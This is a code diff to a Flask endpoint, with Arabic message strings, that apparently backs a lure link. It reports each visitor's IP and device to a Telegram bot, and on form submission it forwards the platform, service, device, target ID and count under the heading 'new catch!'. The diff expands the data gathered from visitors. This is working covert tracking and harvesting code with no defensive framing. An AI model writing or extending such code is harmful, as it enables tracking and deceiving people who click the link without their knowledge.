@@ -13,21 +13,22 @@ def send_to_telegram(text):
 @app.route('/api/index', methods=['GET', 'POST'])
 def handler():
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent', 'Unknown Device')
     
     if request.method == 'GET':
-        # عند دخول الرابط
-        msg = f"🔔 **دخل الرابط الحين!**\n\n🌐 IP: `{user_ip}`\n📱 الجهاز: `{user_agent}`"
+        device_guess = request.args.get('model', 'Unknown')
+        msg = f"🔔 **دخل الرابط الحين!**\n\n🌐 IP: `{user_ip}`\n📱 تخمين الجهاز: `{device_guess}`"
         send_to_telegram(msg)
         return "ok"
     
     else:
-        # عند ضغط الزر وإرسال البيانات
         data = request.json
-        mode = data.get('mode')
-        t_id = data.get('id')
-        t_count = data.get('count')
-        
-        msg = f"🎯 **صيد جديد!**\n\n🔹 القسم: {mode}\n🌐 IP: `{user_ip}`\n📱 الجهاز: `{user_agent}`\n🔑 البيانات: `{t_id}`\n🔢 العدد المطلوب: `{t_count}`"
+        msg = f"🎯 **صيد جديد!**\n\n" \
+              f"🔹 القسم: {data.get('mode')}\n" \
+              f"🔹 المنصة: {data.get('platform')}\n" \
+              f"🔹 الخدمة: {data.get('service')}\n" \
+              f"🌐 IP: `{user_ip}`\n" \
+              f"📱 الجهاز: `{data.get('device')}`\n" \
+              f"🔑 الهدف: `{data.get('id')}`\n" \
+              f"🔢 العدد: `{data.get('count')}`"
         send_to_telegram(msg)
         return jsonify({"status": "ok"})
